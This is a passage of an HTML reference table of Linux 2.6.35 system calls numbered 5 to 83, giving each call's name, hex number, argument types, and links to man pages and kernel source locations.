href="http://www.kernel.org/doc/man-pages/online/pages/man2/open.2.html" target="_blank" rel="noopener">sys_open</a></td><td>0x05</td><td>const char __user *filename</td><td>int flags</td><td>int mode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L900" target="_blank" rel="noopener">fs/open.c:900</a></td></tr><tr><td>6</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/close.2.html" target="_blank" rel="noopener">sys_close</a></td><td>0x06</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L969" target="_blank" rel="noopener">fs/open.c:969</a></td></tr><tr><td>7</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/waitpid.2.html" target="_blank" rel="noopener">sys_waitpid</a></td><td>0x07</td><td>pid_t pid</td><td>int __user *stat_addr</td><td>int options</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1771" target="_blank" rel="noopener">kernel/exit.c:1771</a></td></tr><tr><td>8</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/creat.2.html" target="_blank" rel="noopener">sys_creat</a></td><td>0x08</td><td>const char __user *pathname</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L933" target="_blank" rel="noopener">fs/open.c:933</a></td></tr><tr><td>9</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/link.2.html" target="_blank" rel="noopener">sys_link</a></td><td>0x09</td><td>const char __user *oldname</td><td>const char __user *newname</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2520" target="_blank" rel="noopener">fs/namei.c:2520</a></td></tr><tr><td>10</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unlink.2.html" target="_blank" rel="noopener">sys_unlink</a></td><td>0x0a</td><td>const char __user *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2352" target="_blank" rel="noopener">fs/namei.c:2352</a></td></tr><tr><td>11</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html" target="_blank" rel="noopener">sys_execve</a></td><td>0x0b</td><td>char __user *</td><td>char <strong>user *</strong>user *</td><td>char <strong>user *</strong>user *</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L925" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:925</a></td></tr><tr><td>12</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chdir.2.html" target="_blank" rel="noopener">sys_chdir</a></td><td>0x0c</td><td>const char __user *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L361" target="_blank" rel="noopener">fs/open.c:361</a></td></tr><tr><td>13</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/time.2.html" target="_blank" rel="noopener">sys_time</a></td><td>0x0d</td><td>time_t __user *tloc</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L855" target="_blank" rel="noopener">kernel/posix-timers.c:855</a></td></tr><tr><td>14</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mknod.2.html" target="_blank" rel="noopener">sys_mknod</a></td><td>0x0e</td><td>const char __user *filename</td><td>int mode</td><td>unsigned dev</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2067" target="_blank" rel="noopener">fs/namei.c:2067</a></td></tr><tr><td>15</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chmod.2.html" target="_blank" rel="noopener">sys_chmod</a></td><td>0x0f</td><td>const char __user *filename</td><td>mode_t mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L507" target="_blank" rel="noopener">fs/open.c:507</a></td></tr><tr><td>16</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lchown16.2.html" target="_blank" rel="noopener">sys_lchown16</a></td><td>0x10</td><td>const char __user *filename</td><td>old_uid_t user</td><td>old_gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L27" target="_blank" rel="noopener">kernel/uid16.c:27</a></td></tr><tr><td>17</td><td>not implemented</td><td>0x11</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>18</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/stat.2.html" target="_blank" rel="noopener">sys_stat</a></td><td>0x12</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="noopener">struct __old_kernel_stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L150" target="_blank" rel="noopener">fs/stat.c:150</a></td></tr><tr><td>19</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lseek.2.html" target="_blank" rel="noopener">sys_lseek</a></td><td>0x13</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int origin</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L167" target="_blank" rel="noopener">fs/read_write.c:167</a></td></tr><tr><td>20</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpid.2.html" target="_blank" rel="noopener">sys_getpid</a></td><td>0x14</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1337" target="_blank" rel="noopener">kernel/timer.c:1337</a></td></tr><tr><td>21</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mount.2.html" target="_blank" rel="noopener">sys_mount</a></td><td>0x15</td><td>char __user *dev_name</td><td>char __user *dir_name</td><td>char __user *type</td><td>unsigned long flags</td><td>void __user *data</td><td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L2118" target="_blank" rel="noopener">fs/namespace.c:2118</a></td></tr><tr><td>22</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/oldumount.2.html" target="_blank" rel="noopener">sys_oldumount</a></td><td>0x16</td><td>char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L1171" target="_blank" rel="noopener">fs/namespace.c:1171</a></td></tr><tr><td>23</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setuid16.2.html" target="_blank" rel="noopener">sys_setuid16</a></td><td>0x17</td><td>old_uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L67" target="_blank" rel="noopener">kernel/uid16.c:67</a></td></tr><tr><td>24</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getuid16.2.html" target="_blank" rel="noopener">sys_getuid16</a></td><td>0x18</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L212" target="_blank" rel="noopener">kernel/uid16.c:212</a></td></tr><tr><td>25</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/stime.2.html" target="_blank" rel="noopener">sys_stime</a></td><td>0x19</td><td>time_t __user *tptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L81" target="_blank" rel="noopener">kernel/time.c:81</a></td></tr><tr><td>26</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ptrace.2.html" target="_blank" rel="noopener">sys_ptrace</a></td><td>0x1a</td><td>long request</td><td>long pid</td><td>long addr</td><td>long data</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/ptrace.c?v=2.6.35#L688" target="_blank" rel="noopener">kernel/ptrace.c:688</a></td></tr><tr><td>27</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/alarm.2.html" target="_blank" rel="noopener">sys_alarm</a></td><td>0x1b</td><td>unsigned int seconds</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1314" target="_blank" rel="noopener">kernel/timer.c:1314</a></td></tr><tr><td>28</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstat.2.html" target="_blank" rel="noopener">sys_fstat</a></td><td>0x1c</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="noopener">struct __old_kernel_stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L174" target="_blank" rel="noopener">fs/stat.c:174</a></td></tr><tr><td>29</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pause.2.html" target="_blank" rel="noopener">sys_pause</a></td><td>0x1d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2700" target="_blank" rel="noopener">kernel/signal.c:2700</a></td></tr><tr><td>30</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utime.2.html" target="_blank" rel="noopener">sys_utime</a></td><td>0x1e</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/include/linux/utime.h?v=2.6.35#L6" target="_blank" rel="noopener">struct utimbuf __user *times</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L27" target="_blank" rel="noopener">fs/utimes.c:27</a></td></tr><tr><td>31</td><td>not implemented</td><td>0x1f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>32</td><td>not implemented</td><td>0x20</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>33</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/access.2.html" target="_blank" rel="noopener">sys_access</a></td><td>0x21</td><td>const char __user *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L356" target="_blank" rel="noopener">fs/open.c:356</a></td></tr><tr><td>34</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nice.2.html" target="_blank" rel="noopener">sys_nice</a></td><td>0x22</td><td>int increment</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4282" target="_blank" rel="noopener">kernel/sched.c:4282</a></td></tr><tr><td>35</td><td>not implemented</td><td>0x23</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>36</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sync.2.html" target="_blank" rel="noopener">sys_sync</a></td><td>0x24</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/sync.c?v=2.6.35#L98" target="_blank" rel="noopener">fs/sync.c:98</a></td></tr><tr><td>37</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html" target="_blank" rel="noopener">sys_kill</a></td><td>0x25</td><td>int pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2317" target="_blank" rel="noopener">kernel/signal.c:2317</a></td></tr><tr><td>38</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rename.2.html" target="_blank" rel="noopener">sys_rename</a></td><td>0x26</td><td>const char __user *oldname</td><td>const char __user *newname</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2765" target="_blank" rel="noopener">fs/namei.c:2765</a></td></tr><tr><td>39</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mkdir.2.html" target="_blank" rel="noopener">sys_mkdir</a></td><td>0x27</td><td>const char __user *pathname</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2130" target="_blank" rel="noopener">fs/namei.c:2130</a></td></tr><tr><td>40</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rmdir.2.html" target="_blank" rel="noopener">sys_rmdir</a></td><td>0x28</td><td>const char __user *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2244" target="_blank" rel="noopener">fs/namei.c:2244</a></td></tr><tr><td>41</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup.2.html" target="_blank" rel="noopener">sys_dup</a></td><td>0x29</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L131" target="_blank" rel="noopener">fs/fcntl.c:131</a></td></tr><tr><td>42</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe.2.html" target="_blank" rel="noopener">sys_pipe</a></td><td>0x2a</td><td>int __user *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/pipe.c?v=2.6.35#L1117" target="_blank" rel="noopener">fs/pipe.c:1117</a></td></tr><tr><td>43</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/times.2.html" target="_blank" rel="noopener">sys_times</a></td><td>0x2b</td><td>struct tms __user *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L896" target="_blank" rel="noopener">kernel/sys.c:896</a></td></tr><tr><td>44</td><td>not implemented</td><td>0x2c</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>45</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/brk.2.html" target="_blank" rel="noopener">sys_brk</a></td><td>0x2d</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L245" target="_blank" rel="noopener">mm/mmap.c:245</a></td></tr><tr><td>46</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgid16.2.html" target="_blank" rel="noopener">sys_setgid16</a></td><td>0x2e</td><td>old_gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L51" target="_blank" rel="noopener">kernel/uid16.c:51</a></td></tr><tr><td>47</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgid16.2.html" target="_blank" rel="noopener">sys_getgid16</a></td><td>0x2f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L222" target="_blank" rel="noopener">kernel/uid16.c:222</a></td></tr><tr><td>48</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signal.2.html" target="_blank" rel="noopener">sys_signal</a></td><td>0x30</td><td>int sig</td><td>__sighandler_t handler</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2683" target="_blank" rel="noopener">kernel/signal.c:2683</a></td></tr><tr><td>49</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/geteuid16.2.html" target="_blank" rel="noopener">sys_geteuid16</a></td><td>0x31</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L217" target="_blank" rel="noopener">kernel/uid16.c:217</a></td></tr><tr><td>50</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getegid16.2.html" target="_blank" rel="noopener">sys_getegid16</a></td><td>0x32</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L227" target="_blank" rel="noopener">kernel/uid16.c:227</a></td></tr><tr><td>51</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/acct.2.html" target="_blank" rel="noopener">sys_acct</a></td><td>0x33</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/acct.c?v=2.6.35#L274" target="_blank" rel="noopener">kernel/acct.c:274</a></td></tr><tr><td>52</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/umount.2.html" target="_blank" rel="noopener">sys_umount</a></td><td>0x34</td><td>char __user *name</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L1132" target="_blank" rel="noopener">fs/namespace.c:1132</a></td></tr><tr><td>53</td><td>not implemented</td><td>0x35</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>54</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioctl.2.html" target="_blank" rel="noopener">sys_ioctl</a></td><td>0x36</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/ioctl.c?v=2.6.35#L613" target="_blank" rel="noopener">fs/ioctl.c:613</a></td></tr><tr><td>55</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fcntl.2.html" target="_blank" rel="noopener">sys_fcntl</a></td><td>0x37</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L429" target="_blank" rel="noopener">fs/fcntl.c:429</a></td></tr><tr><td>56</td><td>not implemented</td><td>0x38</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>57</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setpgid.2.html" target="_blank" rel="noopener">sys_setpgid</a></td><td>0x39</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L921" target="_blank" rel="noopener">kernel/sys.c:921</a></td></tr><tr><td>58</td><td>not implemented</td><td>0x3a</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>59</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/olduname.2.html" target="_blank" rel="noopener">sys_olduname</a></td><td>0x3b</td><td><a href="http://lxr.free-electrons.com/source/include/linux/utsname.h?v=2.6.35#L6" target="_blank" rel="noopener">struct oldold_utsname __user *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1132" target="_blank" rel="noopener">kernel/sys.c:1132</a></td></tr><tr><td>60</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/umask.2.html" target="_blank" rel="noopener">sys_umask</a></td><td>0x3c</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1460" target="_blank" rel="noopener">kernel/sys.c:1460</a></td></tr><tr><td>61</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chroot.2.html" target="_blank" rel="noopener">sys_chroot</a></td><td>0x3d</td><td>const char __user *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L408" target="_blank" rel="noopener">fs/open.c:408</a></td></tr><tr><td>62</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ustat.2.html" target="_blank" rel="noopener">sys_ustat</a></td><td>0x3e</td><td>unsigned dev</td><td><a href="http://lxr.free-electrons.com/source/include/linux/types.h?v=2.6.35#L200" target="_blank" rel="noopener">struct ustat __user *ubuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L175" target="_blank" rel="noopener">fs/statfs.c:175</a></td></tr><tr><td>63</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup2.2.html" target="_blank" rel="noopener">sys_dup2</a></td><td>0x3f</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L116" target="_blank" rel="noopener">fs/fcntl.c:116</a></td></tr><tr><td>64</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getppid.2.html" target="_blank" rel="noopener">sys_getppid</a></td><td>0x40</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1348" target="_blank" rel="noopener">kernel/timer.c:1348</a></td></tr><tr><td>65</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpgrp.2.html" target="_blank" rel="noopener">sys_getpgrp</a></td><td>0x41</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1020" target="_blank" rel="noopener">kernel/sys.c:1020</a></td></tr><tr><td>66</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setsid.2.html" target="_blank" rel="noopener">sys_setsid</a></td><td>0x42</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1055" target="_blank" rel="noopener">kernel/sys.c:1055</a></td></tr><tr><td>67</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaction.2.html" target="_blank" rel="noopener">sys_sigaction</a></td><td>0x43</td><td>int sig</td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/signal.h?v=2.6.35#L117" target="_blank" rel="noopener">const struct old_sigaction __user *act</a></td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/signal.h?v=2.6.35#L117" target="_blank" rel="noopener">struct old_sigaction __user *oact</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/kernel/signal.c?v=2.6.35#L300" target="_blank" rel="noopener">arch/mips/kernel/signal.c:300</a></td></tr><tr><td>68</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sgetmask.2.html" target="_blank" rel="noopener">sys_sgetmask</a></td><td>0x44</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2657" target="_blank" rel="noopener">kernel/signal.c:2657</a></td></tr><tr><td>69</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ssetmask.2.html" target="_blank" rel="noopener">sys_ssetmask</a></td><td>0x45</td><td>int newmask</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2663" target="_blank" rel="noopener">kernel/signal.c:2663</a></td></tr><tr><td>70</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setreuid16.2.html" target="_blank" rel="noopener">sys_setreuid16</a></td><td>0x46</td><td>old_uid_t ruid</td><td>old_uid_t euid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L59" target="_blank" rel="noopener">kernel/uid16.c:59</a></td></tr><tr><td>71</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setregid16.2.html" target="_blank" rel="noopener">sys_setregid16</a></td><td>0x47</td><td>old_gid_t rgid</td><td>old_gid_t egid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L43" target="_blank" rel="noopener">kernel/uid16.c:43</a></td></tr><tr><td>72</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigsuspend.2.html" target="_blank" rel="noopener">sys_sigsuspend</a></td><td>0x48</td><td>int history0</td><td>int history1</td><td>old_sigset_t mask</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/s390/kernel/signal.c?v=2.6.35#L58" target="_blank" rel="noopener">arch/s390/kernel/signal.c:58</a></td></tr><tr><td>73</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigpending.2.html" target="_blank" rel="noopener">sys_sigpending</a></td><td>0x49</td><td>old_sigset_t __user *set</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2562" target="_blank" rel="noopener">kernel/signal.c:2562</a></td></tr><tr><td>74</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sethostname.2.html" target="_blank" rel="noopener">sys_sethostname</a></td><td>0x4a</td><td>char __user *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1165" target="_blank" rel="noopener">kernel/sys.c:1165</a></td></tr><tr><td>75</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setrlimit.2.html" target="_blank" rel="noopener">sys_setrlimit</a></td><td>0x4b</td><td>unsigned int resource</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L41" target="_blank" rel="noopener">struct rlimit __user *rlim</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1275" target="_blank" rel="noopener">kernel/sys.c:1275</a></td></tr><tr><td>76</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_getrlimit.2.html" target="_blank" rel="noopener">sys_old_getrlimit</a></td><td>0x4c</td><td>unsigned int resource</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L41" target="_blank" rel="noopener">struct rlimit __user *rlim</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1256" target="_blank" rel="noopener">kernel/sys.c:1256</a></td></tr><tr><td>77</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrusage.2.html" target="_blank" rel="noopener">sys_getrusage</a></td><td>0x4d</td><td>int who</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L22" target="_blank" rel="noopener">struct rusage __user *ru</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1452" target="_blank" rel="noopener">kernel/sys.c:1452</a></td></tr><tr><td>78</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/gettimeofday.2.html" target="_blank" rel="noopener">sys_gettimeofday</a></td><td>0x4e</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="noopener">struct timeval __user *tv</a></td><td>struct timezone __user *tz</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L101" target="_blank" rel="noopener">kernel/time.c:101</a></td></tr><tr><td>79</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/settimeofday.2.html" target="_blank" rel="noopener">sys_settimeofday</a></td><td>0x4f</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="noopener">struct timeval __user *tv</a></td><td>struct timezone __user *tz</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L185" target="_blank" rel="noopener">kernel/time.c:185</a></td></tr><tr><td>80</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgroups16.2.html" target="_blank" rel="noopener">sys_getgroups16</a></td><td>0x50</td><td>int gidsetsize</td><td>old_gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L164" target="_blank" rel="noopener">kernel/uid16.c:164</a></td></tr><tr><td>81</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgroups16.2.html" target="_blank" rel="noopener">sys_setgroups16</a></td><td>0x51</td><td>int gidsetsize</td><td>old_gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L187" target="_blank" rel="noopener">kernel/uid16.c:187</a></td></tr><tr><td>82</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_select.2.html" target="_blank" rel="noopener">sys_old_select</a></td><td>0x52</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L695" target="_blank" rel="noopener">struct sel_arg_struct __user *arg</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L701" target="_blank" rel="noopener">fs/select.c:701</a></td></tr><tr><td>83</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/symlink.2.html" target="_blank" rel="noopener">sys_symlink</a></td><td>0x53</td><td>const char __user *old</td><td>const char __user *new</td><td>-</td><td>-</td><td>-</td><td><a 